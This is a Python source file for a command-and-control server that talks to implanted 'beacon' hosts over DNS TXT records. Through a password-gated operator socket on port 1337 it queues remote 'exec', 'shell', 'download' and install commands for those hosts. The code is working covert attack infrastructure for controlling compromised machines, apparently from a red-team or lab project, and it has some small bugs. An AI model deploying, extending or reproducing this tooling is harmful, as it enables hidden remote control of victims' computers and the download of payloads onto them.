import argparse
import base64
import json
import pickle
import socket
import string
import struct
import threading
import time
from datetime import datetime, timedelta

from host import Host


def base62_encode(data: bytes) -> str:
    """Encode bytes to a base62 encoded string."""
    BASE62_CHARSET = string.digits + string.ascii_letters
    # Convert the input bytes to an integer
    num = int.from_bytes(data, 'big')
    if num == 0:
        return BASE62_CHARSET[0]

    base62 = []
    while num:
        num, rem = divmod(num, 62)
        base62.append(BASE62_CHARSET[rem])

    return ''.join(reversed(base62))


def base62_decode(encoded_str: str) -> bytes:
    """Decode a base62 encoded string back to bytes."""
    BASE62_CHARSET = string.digits + string.ascii_letters
    num = 0
    for char in encoded_str:
        num = num * 62 + BASE62_CHARSET.index(char)

    # Calculate the number of bytes needed to represent num
    num_bytes_length = (num.bit_length() + 7) // 8
    # Convert the integer back to bytes
    num_bytes = num.to_bytes(num_bytes_length, 'big')
    return num_bytes


def parse_query(data):
    """
    Parse the DNS query packet and extract the transaction ID, query type, query class, and the hostname.
    """
    # print(data)
    transaction_id = struct.unpack(">H", data[:2])[0]
    flags = struct.unpack(">H", data[2:4])[0]
    questions = struct.unpack(">H", data[4:6])[0]

    # Initialize the position just after the header (which is 12 bytes long)
    pos = 12

    # Parse the QNAME
    labels = []
    while data[pos] != 0:
        length = data[pos]
        pos += 1
        labels.append(data[pos:pos + length])
        pos += length
    # Convert the labels from bytes to a string and join them with '.'
    hostname = b'.'.join(labels).decode()

    # Move past the null byte that marks the end of the QNAME
    pos += 1

    # Extract QTYPE and QCLASS
    qtype, qclass = struct.unpack(">HH", data[pos:pos + 4])

    return transaction_id, qtype, qclass, flags, questions, hostname


def create_txt_response(transaction_id, query, ttl, data, qclass=1):
    if not isinstance(data, bytes):
        data = data.encode()

    # Header
    transaction_id = struct.pack(">H", transaction_id)
    # Response, recursion desired, recursion available, no error
    flags = struct.pack(">H", 0x8500)
    qdcount = struct.pack(">H", 1)  # One question
    ancount = struct.pack(">H", 1)  # One answer
    nscount = struct.pack(">H", 0)  # One authoritative records
    arcount = struct.pack(">H", 0)  # No additional records
    header = transaction_id + flags + qdcount + ancount + nscount + arcount

    # Question Section (echoed back)
    question = query[12:]  # Simplified, assuming the query starts at byte 12

    # Answer Section
    name = b'\xc0\x0c'  # Pointer to the domain name in the question section
    rtype = struct.pack(">H", 16)  # TXT record type
    _class = struct.pack(">H", qclass)  # Class type
    ttl = struct.pack(">I", ttl)  # TTL of 300 seconds
    txt_length = len(data)
    rdlength = struct.pack(">H", txt_length + 1)  # Length of the data plus length byte
    rdata = struct.pack("B", txt_length) + data  # TXT record starts with length byte
    answer = name + rtype + _class + ttl + rdlength + rdata

    return header + question + answer


def handle_query(data, client, sock):
    transaction_id, qtype, qclass, flags, questions, qname = parse_query(data)
    address = client[0]
    if debug:
        print(
            f"[c2-server-debug] Received query from {address}: Transaction ID: {transaction_id}, Type: {qtype},"
            f" Class: {qclass}, Flags: {flags}, Questions: {questions}, Qname: {qname}")
    response = create_txt_response(transaction_id, data, 0, '')  # Default response, ttl zero = error

    match qclass:
        case 1:  # IN Class, for beacon -> server communication
            match qtype:
                case 1:  # Hello
                    # Respond with ttl 200 and no data.
                    print(f"[c2-server] {address} sent 'client hello' packet")
                case 24:  # Beacon status update
                    # Receive command number and return code
                    # Respond with ttl 200 and no data.
                    labels = qname.split('.')
                    command_number = int(labels[0])
                    return_code = labels[1]
                    db[address].last_seen = datetime.now()
                    # dict {cmd_number: {'cmd': cmd, 'return_code': return_code}, ...}
                    # debug_db = db
                    try:
                        db[address].cmd_history[command_number]['return_code'] = return_code
                        print(f"[c2-server] {address} sent status update with command number: {command_number} "
                              f"and return code: {return_code}")
                    except KeyError:
                        pass
                    if debug:
                        print(f"[c2-server-debug] Last seen time updated for {db[address].hostname}@{address}")
                case 28:  # Beacon Connect
                    # Receive beacon hostname
                    # Respond with 200+beacon interval and the session key.
                    print(f"[c2-server] {address} sent 'beacon connect' packet")
                    beacon_hostname = qname.split('.')[0]
                    db[address] = Host(beacon_hostname, address)
                    print(f"[c2-server] {beacon_hostname}@{address} was added to the database.")
                    if debug:
                        print(f"[c2-server-debug] Beacon hostname: {beacon_hostname}")
                        print(f"[c2-server-debug] New DB entry: {db[address]}")
                    response = create_txt_response(transaction_id, data, 200 + beacon_interval,
                                                   base62_encode(db[address].session_key))
                case 16:  # Beacon
                    # Respond with ttl 302 if the beacon host is in the db, and send the command.
                    # Respond with ttl 404 if the beacon host server was deleted from the db, no data.
                    if debug:
                        print(f"[c2-server-debug] Received a beacon from {address}")
                    try:
                        if not bool(db[address].cmd_queue): # If the deque is empty...
                            db[address].cmd_queue.append({'cmd': 'nop', 'args': ''})
                        response = create_txt_response(transaction_id, data, 200,
                                                       base62_encode(json.dumps(db[address].cmd_queue.pop()).encode()))
                        db[address].last_seen = datetime.now()
                        if debug:
                            print(f"[c2-server-debug] Last seen time updated for {db[address].hostname}@{address}")
                    except KeyError:
                        response = create_txt_response(transaction_id, data, 404, '')
                case _:  # Default case for unknown types
                    print(f"[c2-server] Unknown type {qtype}")
        case _:
            print(f"[c2-server] Unknown class {qclass}")

    sock.sendto(response, client)


def beacon_server(run_event):
    # Create a UDP socket and bind it to listen_address:beacon_server_port
    beacon_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (beacon_server_listen_address, beacon_server_port)
    beacon_sock.bind(server_address)
    print(f"[c2-server] C2 Server listening on {beacon_server_listen_address}:{beacon_server_port}")

    while run_event.is_set():
        data, client_address = beacon_sock.recvfrom(512)  # DNS packet size limit is 512 bytes
        handle_query(data, client_address, beacon_sock)

    beacon_sock.close()


def beacon_watchdog(run_event):
    while run_event.is_set():
        timeouts = []
        for ip, host in db.items():
            if (datetime.now() - host.last_seen) > timedelta(seconds=beacon_interval * 5):
                timeouts.append(ip)
        for ip in timeouts:
            print(f"[watchdog] {db[ip].hostname}@{ip} has timed out and was deleted from the database.")
            del db[ip]
        time.sleep(5)


def chaos_server(run_event):
    while True:
        try:
            chaos_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            chaos_socket.bind((chaos_server_listen_address, chaos_server_port))
            chaos_socket.listen(1)
            print(f"[chaos-server] Chaos server listening on {chaos_server_listen_address}:{chaos_server_port}")
            break
        except OSError:
            print(f"[chaos-server] port already in use, retrying...")
            time.sleep(1)

    try:
        while run_event.is_set():
            conn, addr = chaos_socket.accept()
            client_address = addr[0]
            print(f"[chaos-server] New commander connecting from {client_address}")
            with conn:
                # Wait for hello
                data = conn.recv(1024).decode()
                secret = ('ODQtMjEtQTogIkkgZG9uJ3Qga25vdyBob3cgbXVjaCBsb25nZXIgSSBjYW4gZ28gb24uIEkgZG8gbm90IHdhbnQgdG8g'
                          'bGl2ZSBhbnltb3JlIGFzIHdoYXQgSSBoYXZlIGJlY29tZS4gVGhlIHJlZCBleWUgYmV5b25kIHRoZSBnYXRlIHNob3dl'
                          'ZCBtZSwgbm8sIHRvdWNoZWQgbWUsIHBvaXNvbmVkIG1lLiBJdCBmZWVscyBsaWtlIG15IG1pbmQgaGFzIGJlZW4gY29u'
                          'dGFtaW5hdGVkLCBkZWZpbGVkLCBieSBhbm90aGVyIHBlcnNvbidzIG1lbW9yeS4gVHMgbm8gbG9uZ2VyIGZ1bGx5IG15'
                          'c2VsZiBhbnltb3JlLCBidXQgSSd2ZSBub3QgZnVsbHkgYmVjb21lIHNvbWVvbmUgZWxzZSBlaXRoZXIuIg==')
                if data != secret:
                    print(f"[chaos-server] Commander @ {client_address} sent secret")
                    break

                # Send the auth ack message
                conn.sendall(base64.b64encode("AUTH ACK".encode()))
                print(f"[chaos-server] Authentication success for commander @ {client_address}")

                # Client loop
                while True:
                    try:
                        command = conn.recv(1024)
                        command = json.loads(base64.b64decode(command).decode())
                        print(f"[chaos-server] Received command from commander @ {client_address}")
                        if debug:
                            print(f'[chaos-server-debug] Command: {command}')
                        match command['cmd']:
                            case 'list':
                                response = pickle.dumps(db)
                            case 'exec':
                                beacon_address = command['args'].split(' ')[0]
                                host = db[beacon_address]
                                host.cmd_number = host.cmd_number + 1
                                args = ' '.join(command['args'].split(' ')[1:])
                                host.cmd_queue.append({'cmd': 'exec', 'number': host.cmd_number,
                                                       'args': args})
                                # dict {cmd_number: {'cmd': cmd, 'return_code': return_code}, ...}
                                host.cmd_history[host.cmd_number] = {'cmd': args, 'return_code': -1,
                                                                     'time_executed': datetime.now().strftime(
                                                                         '%m-%d %H:%M:%S')}
                                print(f"New command: {db[beacon_address].cmd_queue[0]}")
                                response = 'OK'
                            case 'shell':
                                beacon_address = command['args'].split(' ')[0]
                                host = db[beacon_address]
                                args = ' '.join(command['args'].split(' ')[1:])
                                host.cmd_queue.append({'cmd': 'shell', 'args': args})
                                print(f"New command: {db[beacon_address].cmd}")
                                print(f'[chaos-server-debug] Host queue: {host.cmd_queue}')
                                response = 'OK'
                            case 'download':
                                beacon_address = command['args'].split(' ')[0]
                                host = db[beacon_address]
                                url = command['args'].split(' ')[1]
                                host.cmd_queue.append({'cmd': 'download', 'number': host.cmd_number, 'args': url})
                                host.cmd_history[host.cmd_number] = {'cmd': f'download {url}', 'return_code': -1,
                                                                     'time_executed': datetime.now().strftime(
                                                                         '%m-%d %H:%M:%S')}
                                print(f"New command: {db[beacon_address].cmd_queue[0]}")
                                response = 'OK'
                            case 'install' | 'uninstall':
                                host = db[command['args'].split(' ')[0]]
                                host.cmd_queue.append({'cmd': command['cmd']})
                        if not isinstance(response, bytes):
                            response = response.encode()
                        conn.sendall(base64.b64encode(response))
                        if debug:
                            print('[chaos-server-debug] RESPONSE SENT')
                    except Exception as e:
                        print(e.__traceback__, str(e))
                        break

    finally:
        print('[chaos-server] SOCKET CLOSED')
        chaos_socket.close()


def main():
    run_event = threading.Event()
    run_event.set()
    beacon_thread = threading.Thread(target=beacon_server, daemon=True, args=(run_event,))
    beacon_thread.start()
    time.sleep(0.1)
    beacon_watchdog_thread = threading.Thread(target=beacon_watchdog, daemon=True, args=(run_event,))
    beacon_watchdog_thread.start()
    time.sleep(0.1)
    chaos_thread = threading.Thread(target=chaos_server, daemon=True, args=(run_event,))
    chaos_thread.start()

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("[main] Closing threads...")
        run_event.clear()


if __name__ == '__main__':
    beacon_server_listen_address = '192.168.102.16'
    chaos_server_listen_address = '192.168.102.16'
    beacon_server_port = 53
    chaos_server_port = 1337
    beacon_interval = 10
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument('--debug', action='store_true', help='Enables debug mode')
    args = parser.parse_args()
    debug = args.debug
    db = {}
    main()
